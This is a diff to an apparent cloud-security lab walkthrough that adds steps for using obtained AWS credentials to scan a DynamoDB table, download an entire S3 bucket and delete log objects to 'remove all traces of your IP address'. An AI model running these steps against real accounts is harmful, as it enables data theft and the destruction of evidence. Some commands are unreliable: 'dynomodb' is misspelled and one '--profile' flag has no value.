@@ -77,9 +77,21 @@ Return to the previous tab
 `aws configure profile --user`  
 * aws_secret_access_key    
 * aws_access_key   
-Add the aws_session_token to the end of the user profile configuration by editing the *~/.aws/credentials* file  
+2. Add the aws_session_token to the end of the user profile configuration by editing the *~/.aws/credentials* file  
 `vim ~/.aws/credentials`
-2. List the database contents
+3. List the database contents  
 `aws dynomodb scan --table-name <table-name> --profile user`
 
 ### S3 Bucket Access with AWS CLI
+1. List Bucket Contents  
+`aws s3 ls <s3-bucket> --profile user`
+2. Download bucket contents  
+`aws s3 sync s3://<s3-bucket> . --profile user`
+3. Review downloaded bucket content  
+`ls -la`
+4. Display commands run via Lambda Function
+`cat <key>`
+5. Remove all traces of your IP address
+`aws s3api delete-object --bucket <s3-bucket> --key <key> --profile`
+6. Repeat for each key value found  
+
